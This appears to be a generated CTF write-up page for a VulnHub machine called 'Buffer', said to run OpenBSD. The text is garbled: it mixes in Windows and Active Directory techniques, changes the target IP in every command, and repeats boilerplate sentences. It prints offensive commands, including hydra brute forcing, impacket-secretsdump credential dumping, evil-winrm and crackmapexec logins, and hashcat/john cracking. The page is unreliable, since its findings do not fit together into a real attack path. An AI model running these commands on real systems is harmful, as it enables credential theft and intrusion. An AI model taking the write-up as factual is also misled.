---
TitleSEO: "VulnHub — Buffer (Insane OpenBSD) | ZureFX"
TitlePost: "VulnHub — Buffer (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Buffer. LXD Privilege Escalation and Unquoted Service Path to achieve insane compromise on OpenBSD."
Keywords: "reversing, forensics, web, medium, offsec, windows, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-buffer-749.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-buffer-749/"
Date: "2025-01-14"
Tags: "Reversing, Forensics, Web, Medium, OffSec, Windows, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-buffer-749"
Permalink: "/writeups/htb-buffer-749.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Buffer** is rated **Insane** on VulnHub. It runs **OpenBSD** and the IP address during this analysis was `10.108.106.57`.

### Objectives

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.58.26.107 -u administrator -p 'P@ssw0rd!' --shares
```

Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit.

### Service Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

```bash
evil-winrm -i 10.30.212.184 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
nmap -sCV -p5432,636,3389 10.26.186.208 -oN scan.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

### Web Enumeration

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

```bash
evil-winrm -i 10.112.200.151 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.98.132.39 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges.

Key finding: **Kerberoasting**.

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

### Initial Access

Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.126.27
impacket-secretsdump administrator:'P@ssw0rd!'@10.129.32.251
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
gobuster dir -u http://10.103.219.176/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.109.29.171
impacket-secretsdump administrator:'P@ssw0rd!'@10.33.184.118
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.106.179.207/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.75.28.74 -u administrator -p 'P@ssw0rd!' --shares
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Summary

### Tools Used

- `dcomexec`
- `hashcat`
- `gobuster`
- `sharphound`
- `chisel`
- `ffuf`
- `bloodhound`

### Key Takeaways

- LXD Privilege Escalation
- Unquoted Service Path
- Kerberoasting
